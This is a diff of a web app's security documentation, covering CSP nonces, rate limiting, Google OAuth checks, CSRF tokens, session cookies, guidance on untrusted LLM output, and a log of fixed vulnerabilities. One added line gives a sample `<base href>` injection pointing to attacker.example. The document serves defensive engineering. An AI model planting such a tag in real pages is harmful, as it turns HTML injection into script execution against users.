@@ -26,6 +26,7 @@ CSP is defined in `securityHeaders.js`: the shared directives live in `BASE_DIRE
 - **Rule:** Never add inline `on*=` handlers. Either use the shared delegated dispatcher in `views/partials/scripts.ejs` (add a `data-act="fn"` / `data-action-change="fn"` / `data-filter-dropdown` / `data-confirm-submit="fn"` / `data-clear-placeholder` hook that maps to a global function in a nonce'd page script), or wire `addEventListener` directly inside a nonce'd `<script>` block. See `views/playground.ejs` (page-scoped `data-action` delegation) for the canonical example.
   - Note: the shared dispatcher uses `data-act` (not `data-action`) precisely so it doesn't collide with `playground.ejs`'s own page-scoped `data-action` listeners.
 - `style-src`, `img-src`, `font-src` are similarly scoped (`BASE_DIRECTIVES`). If adding new CDN resources, add them to the relevant directive in `securityHeaders.js`.
+- **`base-uri` is locked to `'self'`.** Without it, an HTML-injection bug could inject a `<base href="https://attacker.example/">` tag that rewrites every root-relative resource on the page — including the nonce'd `<script src="/js/...">` loaders — to load from an attacker origin, escalating the injection to full script execution despite the nonce policy (#427).
 
 **CSP blocks inline event handler attributes.** The enforcing policy blocks `oninput="fn()"`, `onchange="fn()"`, and similar inline event attributes. Wire up listeners inside a nonce'd `<script>` block instead:
 
@@ -44,7 +45,7 @@ CSP is defined in `securityHeaders.js`: the shared directives live in `BASE_DIRE
 
 The enforcing `Content-Security-Policy` is the strict nonce policy (no
 `'unsafe-inline'`); a mirrored report-only header runs alongside purely as a
-regression-telemetry channel (`docs/private/red-team-hardening.md` § H1).
+regression-telemetry channel (H1 — nonce CSP, shipped).
 
 - `securityHeaders` generates a per-request nonce (`randomBytes(16)`) and exposes
   it as `res.locals.cspNonce`. **Every first-party `<script>` tag (inline and
@@ -84,14 +85,15 @@ Limiters in use:
 - **Login limiter** (Firestore, keyed `login:<ip>`): 15 / 10 min on `GET /auth/google/start`, `GET /auth/google/user/start`, and the shared `GET /auth/google/callback` (`src/routes/pointsRoutes.js`).
 - **Verify limiter** (Firestore, keyed `verify:<entryId>`): 10 / 10 min on `POST /my-entry/verify`, layered after the public limiter. Keying on `entryId` blocks email brute-force even when the attacker rotates IPs. Tradeoff: someone who knows an `entryId` can exhaust that entry's budget, locking the owner out for up to 10 min — low impact, and the price of IP-rotation-proof protection.
 - **Public limiter** (in-memory): 30 / min on the public POST routes in `src/routes/viewRoutes.js`.
+- **Create-entry limiter** (Firestore, keyed `createEntry:<ip>`): 30 / min on `POST /newEntry` and `POST /entryVerify`, layered after a synchronous `isRegistrationOpen()` check so the Firestore transaction only runs while registration is open. Unlike the routes above, entry creation is unauthenticated *and* writes to Firestore, so it gets the global Firestore-backed cap instead of the per-instance in-memory one (#334).
 
-Both backends key by `req.ip` (with `req.socket.remoteAddress` as the only fallback in the in-memory limiter). Do not manually parse `x-forwarded-for`; Express's `req.ip` already applies the configured `trust proxy` policy.
+Both backends key by a **normalized IP** via `normalizeIP` (exported from `rateLimit.js`). IPv6 addresses are collapsed to their `/64` prefix (e.g. `2001:db8:1:2::/64`) so that an attacker cycling through the 2^64 addresses in a single /64 block still hits one counter. IPv4 and IPv4-mapped IPv6 addresses are used host-exact. `req.socket.remoteAddress` is the fallback when `req.ip` is absent. Do not manually parse `x-forwarded-for`; Express's `req.ip` already applies the configured `trust proxy` policy.
 
 The Firestore limiter **fails open** on store errors (a Firestore outage must not lock users out of login) and has a kill switch: set `RATE_LIMIT_FIRESTORE_DISABLED=1` to bypass the store. Once a window has hit its cap, `incrementWindow` returns a blocking count **without writing** — so a flood against one key can't exceed Firestore's ~1 write/s/doc soft limit and trigger contention failures that (via fail-open) would otherwise let blocked requests through. This also bounds writes to `max` per window per key, protecting the cost contract. Counter docs live in the `rateLimits` collection; windows reset in place so the collection is bounded by distinct keys, and an optional Firestore TTL policy on the `expireAt` field reaps abandoned keys for free.
 
 `trust proxy` is set to `1` in `server.js`, which is required when running behind Cloud Run / proxy infrastructure. If the app is deployed behind a different proxy chain, update `trust proxy` in `server.js` rather than changing the limiter to read raw forwarding headers.
 
-Expired client entries are overwritten when a client returns. As a guard against unbounded growth from one-off IPs, the limiter sweeps expired entries whenever the client map reaches 1,000 entries and a new client arrives.
+Expired client entries are overwritten when a client returns. The in-memory limiter guards against unbounded growth two ways: a size-triggered sweep when the client map reaches 1,000 entries and a new client arrives, **and** a periodic `setInterval` sweep (`.unref()`'d so it doesn't hold the event loop open during tests or graceful shutdown). The periodic sweep catches the rotating-IP flood case where many keys enter within one window without any single insertion crossing the 1,000-entry threshold.
 
 ## Safe JSON Embedding in `<script>` Tags
 
@@ -153,8 +155,8 @@ Admin routes are protected by **session-based authentication** via `requireSiteA
 2. User clicks sign-in → `GET /auth/google/start`. Sets `req.session.rememberMe` (if `?remember=1`), generates `req.session.oauthState`, saves session, redirects to Google via `getAuthUrl(oauthState)` in `src/config/auth.js`.
 3. Google redirects to `GET /auth/google/callback` with an authorization code and `state`.
 4. `googleAuthCallback` consumes `req.session.oauthState` and `req.session.oauthRole`. Rejects if `state` is missing or mismatched. The **role lives in the session, not in the `state` string** (so it can't be tampered with) and defaults to `"admin"` when absent, leaving the legacy flow unchanged. The callback is shared with the participant flow (below) and branches on this role.
-5. Exchanges code for tokens via `getToken()`. Verifies ID token with `audience: getGoogleClientId()` (**required** — without it, tokens from other OAuth clients would pass). For the admin role: checks email against `ADMIN_EMAILS`, calls `req.session.regenerate()`, sets `req.session.siteAdmin = true`.
-6. Extends `cookie.maxAge` to 30 days if `rememberMe` was set; otherwise 8-hour session.
+5. Exchanges code for tokens via `getToken()`. Verifies ID token with `audience: getGoogleClientId()` (**required** — without it, tokens from other OAuth clients would pass) and rejects unless the payload's `email_verified === true` (**required** — a Google account can present an alternate email it never proved control of, and ownership/allowlist checks key entirely on this claim; strict `=== true` so a missing claim fails closed). For the admin role: checks email against `ADMIN_EMAILS`, calls `req.session.regenerate()`, sets `req.session.siteAdmin = true`.
+6. Sets `cookie.maxAge` to 30 days if `rememberMe` was set; otherwise 8-hour session. This admin policy value always wins on a fresh admin login — it is never `Math.max`'d against a longer-lived `maxAge` a coexisting participant ("My Brackets") login may have left on the same session doc, or the documented 8h/30d admin lifetime would be silently voided by prior participant use (#426). Symmetrically, a participant login onto an existing admin session keeps the admin's already-capped `maxAge` rather than extending it to the participant's own 14-day lifetime.
 7. All subsequent admin requests gated by `requireSiteAdmin`, which checks `req.session?.siteAdmin`.
 8. `POST /admin/logout` destroys the session and redirects to `/updates`.
 
@@ -162,11 +164,11 @@ Admin routes are protected by **session-based authentication** via `requireSiteA
 
 `startGoogleAuth` reassigns `rememberMe` on every start to prevent a stale session carrying a previous value.
 
-## CSRF Protection for Admin POSTs (`src/middleware/csrf.js`)
+## CSRF Protection for State-Changing POSTs (`src/middleware/csrf.js`)
 
 Every state-changing admin POST (all 26 `requireSiteAdmin` POST routes, including `POST /admin/cloud/deploy` and the destructive deletes) is guarded by a **per-session synchronizer token** — hand-rolled, no dependency, in the same spirit as `securityHeaders.js` replacing helmet. This breaks the stored-XSS → CSRF-less-deploy chain at its terminal sink (security audit 2026-06-09, finding 4): even a same-origin forged request (which `sameSite: 'lax'` and `httpOnly` do nothing against) is rejected without the token.
 
-- **`attachCsrfToken`** (mounted globally in `server.js`, after the session middleware): mints a 32-byte base64url token into `req.session.csrfToken` and exposes it as `res.locals.csrfToken` — **only when the session already carries `siteAdmin`**. Anonymous traffic never triggers a session write, so `saveUninitialized: false` and the $0 cost contract stay intact.
+- **`attachCsrfToken`** (mounted globally in `server.js`, after the session middleware): mints a 32-byte base64url token into `req.session.csrfToken` and exposes it as `res.locals.csrfToken` — **only when the session already carries `siteAdmin`, `userEmail`, or `verifiedEntries`** (i.e. any authenticated session, or a public entry verified via `/my-entry/verify`, #301). Anonymous traffic never triggers a session write, so `saveUninitialized: false` and the $0 cost contract stay intact. The token is also exported as `ensureCsrfToken` so the login flow can mint it eagerly at admin promotion (where `regenerate`+`save` already serialize), avoiding the race where two tabs open before any token exists and the last-write-wins session write invalidates the other tab's rendered token.
 - **`verifyCsrf`**: mounted **after** `requireSiteAdmin` on each admin POST (unauthenticated callers still get the 401). Accepts the token from the `x-csrf-token` header (AJAX) or the `_csrf` body field (HTML forms); constant-time comparison; 403 JSON on mismatch.
 - **Templates:** admin forms carry `<input type="hidden" name="_csrf" value="<%= csrfToken %>">`; admin AJAX `fetch` calls send `'x-csrf-token': '<%= csrfToken %>'`. When adding a new admin POST route or form, add both the `verifyCsrf` guard and the token — `tests/routes.test.js` fails if an admin POST is registered without `verifyCsrf`.
 - `POST /admin/logout` is deliberately not CSRF-guarded (forcing a logout is equivalent to session expiry; a 403 there could strand a stale tab).
@@ -174,6 +176,8 @@ Every state-changing admin POST (all 26 `requireSiteAdmin` POST routes, includin
 - Tests: `tests/csrf.test.js` (token minting, admin-only attachment, header/body acceptance, rejection paths) and the route-composition assertions in `tests/routes.test.js`.
 
 Sessions persist in Firestore (`express-sessions` collection), surviving Cloud Run restarts. Each session doc carries an `expireAt` Firestore `Timestamp` (mirroring the `rateLimits` pattern) so a TTL policy can reap expired sessions — see the one-time setup in [deployment.md](./deployment.md#firestore-one-time-setup); the store also opportunistically deletes expired docs on read, so the collection stays bounded even if the TTL policy is missing (security audit 2026-06-09, finding 2). **Do not reintroduce `requireAdminReferrer`** — `Referer` is not a security control.
+
+The session cookie is named **`__Host-bracket.sid`** in production and `bracket.sid` in local dev. The `__Host-` prefix is browser-enforced: the cookie must be `Secure`, have no `Domain` attribute, and be scoped to `path=/` — the browser rejects any attempt to set or overwrite it from a non-HTTPS page or subdomain, closing subdomain cookie-injection and fixation vectors. The prefix cannot be applied in local dev because it requires the `Secure` flag, which is not set on plain HTTP.
 
 Admin access: comma-separated `ADMIN_EMAILS` env var. See `src/config/auth.js`.
 
@@ -203,7 +207,7 @@ Pattern (used in `myEntryVerify` and both branches of `googleAuthCallback` — a
 
 `req.session.regenerate()` and `req.session.save()` are callback-based; use the `regenerateSession(req)` / `saveSession(req)` promise helpers in `controllerUtils.js` rather than hand-rolling `new Promise()` wrappers.
 
-**Google session clearing:** Administrators can clear all active Google Sign-in sessions via the admin console (`POST /clearGoogleSessions`, protected by `requireSiteAdmin`). This deletes all session documents from the `express-sessions` Firestore collection that have `userEmail` or `adminEmail` fields set, logging those users out immediately. Under standard operations, memory cache flushes (generic cache clear) do **not** affect active sessions.
+**Google session clearing:** Administrators can clear active Google Sign-in sessions via the admin console (`POST /clearGoogleSessions`, protected by `requireSiteAdmin`). Because `handleUserLogin`/`handleAdminLogin` merge both identities onto one session doc when the same browser signs into both flows (see above), the default scope is **participant-only**: session docs are deleted outright unless they also carry `adminEmail`, in which case only the `userEmail` field is stripped and the doc (and its admin session) survives. Pure admin-only docs are left untouched by default. Passing `{ includeAdmins: true }` in the request body (the admin-console "Also sign out admin console sessions" checkbox) restores full incident-response scope — every doc with `userEmail` or `adminEmail` set is deleted, admins included. Under standard operations, memory cache flushes (generic cache clear) do **not** affect active sessions. (#428)
 
 ## Public Entry Edit Authorization
 
@@ -227,13 +231,40 @@ This prevents a session verified for one tournament year from updating the same 
 - **Non-production:** `message`, `operation`, and `service` details included.
 - **All environments:** full detail logged via `Logger.error`.
 
+## Treating LLM / Model Output as Untrusted Input
+
+**Standing constraint — write it down before the first AI-in-the-page feature
+ships, not after.** Today all LLM material lives in `ai_private/` as **offline
+tooling** (data-gathering scripts, prompts, generated stats JSON) and is never
+rendered to users at request time. That offline boundary is the current
+safeguard. The moment any LLM-derived text (a generated bracket guide, an AI
+summary, a chatbot reply) is rendered into a page or used to make a decision,
+the threat model changes and these rules apply:
+
+- **Treat all model output as untrusted user input.** It can contain
+  attacker-controlled content (prompt injection via the data the model
+  ingested). If it is rendered, escape it exactly as you would a user's team
+  name — never `<%- … %>` it; use the `safeJson` / escaped paths. The
+  nonce-based CSP is the second layer here, but escaping is the first.
+- **Never let model output reach a sink with authority.** No feeding it into
+  shell, DB queries, `eval`, file paths, or admin actions. The deploy / cloud
+  endpoints must stay human-gated — model output must never trigger them.
+- **Keep secrets out of prompts and context.** Anything in a prompt can be
+  exfiltrated by injection. The `ai_private` scripts must never embed
+  `SESSION_SECRET`, OAuth secrets, or service-account keys.
+- **Pin and review the data the pipeline ingests.** A generation step that
+  scrapes the open web inherits whatever instructions live on those pages —
+  review and constrain its inputs.
+
 ## Outstanding Security Items
 
-- _(none currently — see `docs/private/red-team-hardening.md` for the residual-risk roadmap, e.g. the CSP enforce-flip H1 and the `sameSite: 'strict'` admin-cookie split.)_
+- _(none currently — the residual-risk roadmap was fully reconciled and all tracked issues are closed.)_
 
 ## Fixed
 
-- **CSRF tokens on admin POSTs (FIXED — 2026-06-10, was Fix #10):** Per-session synchronizer token (`src/middleware/csrf.js`) enforced on all 26 admin POST routes; 19 forms carry the `_csrf` hidden input and 19 admin AJAX calls send the `x-csrf-token` header. Admin-session-only minting keeps anonymous traffic write-free. See § CSRF Protection for Admin POSTs and audit finding 4.
+- **Unverified Google email claim accepted (FIXED — 2026-07-03, #333):** `extractGoogleEmail` trusted `payload.email` without checking `email_verified`, so an attacker could add a victim's registration email to a Google account as an unverified alias and sign in as them — taking over their "My Brackets" entries, or gaining `siteAdmin` if an `ADMIN_EMAILS` entry was on a non-Google-hosted domain. The callback now requires `email_verified === true` before either login path runs; the response body stays the shared generic "Authentication failed". See `tests/pointsController.test.js`.
+- **CSRF tokens on admin POSTs (FIXED — 2026-06-10, was Fix #10):** Per-session synchronizer token (`src/middleware/csrf.js`) enforced on all 26 admin POST routes; 19 forms carry the `_csrf` hidden input and 19 admin AJAX calls send the `x-csrf-token` header. Admin-session-only minting keeps anonymous traffic write-free. See § CSRF Protection for State-Changing POSTs and audit finding 4.
+- **CSRF on `/my-entry/update` (FIXED — 2026-07-11, #301):** `attachCsrfToken` now also mints for `verifiedEntries` sessions, and `verifyCsrf` guards `POST /my-entry/update`, closing a cross-site top-level-form-POST forgery that let an attacker overwrite a victim's public entry using the `entryId`/`year` visible in their `/my-entry/edit` URL. See § CSRF Protection for State-Changing POSTs.
 - **`/csp-report` log injection (FIXED — 2026-06-10):** `logCspReport` strips control characters, caps field length at 256, and bounds entries at 10 per request; the route's body parser no longer accepts generic `application/json`. See § Content Security Policy and audit finding 3.
 - **`innerHTML` string-building migration completed across remaining views (FIXED — 2026-05-30):** The six views that still string-built `innerHTML` with a hand-rolled `esc()` were converted to DOM construction (`createElement` / `textContent` / `dataset` / `<template>` clone + `replaceChildren`): `playground.ejs` (public results simulator — game cards, simulated picks, standings), `newtournement.ejs` (find-team modal), `newTourneyComplete.ejs` (First Four rows + `<option>`/`<optgroup>` builders), `adminTournament.ejs` (ESPN games list), `newTourneyGames.ejs` (add-team status), and `editTeam.ejs` (conference-history rows). No reachable injection existed (every value was escaped and attributes were double-quoted), but the fragile pattern — where correctness depended on never missing an interpolation — is now eliminated. All per-view `esc` helpers and `playground`'s `escHtml` (which silently omitted single-quote escaping) were removed. Client-side DOM test coverage (jsdom) was deferred as a follow-up. Static-string-only `innerHTML` placeholders (no interpolated data) remain in `adminEntries.ejs` and `updater.ejs` — not injection sinks. See § Safe Dynamic DOM Construction.
 - **XSS via `innerHTML` status messages in `newTourneyComplete.ejs` (FIXED — 2026-05-29):** The admin "new tournament" view built add-team and create-tournament status messages by interpolating team data and error/exception text into HTML strings assigned to `statusEl.innerHTML`. A crafted team name, API error, or exception `message` could execute script in the admin's session. All status writes now route through a `setStatus(el, text, type)` helper that builds a `<span>` via `textContent` (guarded with `if (!el) return;`). See "Safe Dynamic DOM Construction" above.
